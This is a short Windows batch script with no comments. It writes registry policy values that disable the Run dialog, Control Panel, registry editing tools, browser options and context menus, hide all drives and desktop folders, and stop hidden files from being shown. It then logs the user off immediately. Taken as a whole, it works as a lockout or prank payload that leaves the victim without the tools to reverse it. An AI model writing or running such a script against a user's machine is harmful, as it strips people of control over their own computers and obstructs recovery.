@echo off
REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoRun /t REG_DWORD /d 1 /f
REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoSMMyDocs /t REG_DWORD /d 1 /f
REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoSetTaskbar /t REG_DWORD /d 1 /f
REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoControlPanel /t REG_DWORD /d 1 /f
REG add "HKCU\Software\Policies\Microsoft\Internet Explorer\Restrictions" /v NoBrowserOptions /t REG_DWORD /d 1 /f
REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoSMMyPictures /t REG_DWORD /d 1 /f
REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoViewOnDrive /t REG_DWORD /d 127 /f
REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableRegistryTools /t REG_DWORD /d 1 /f
REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoTrayContextMenu /t REG_DWORD /d 1 /f
REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoViewContextMenu /t REG_DWORD /d 1 /f
REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoStartMenuMyMusic /t REG_DWORD /d 1 /f
REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL /v CheckedValue /t REG_DWORD /d 0 /f
REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\NonEnum /v {450D8FBA-AD25-11D0-98A8-0800361B1103} /t REG_DWORD /d 1 /f
REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\NonEnum /v {20D04FE0-3AEA-1069-A2D8-08002B30309D} /t REG_DWORD /d 1 /f
shutdown -l -t 0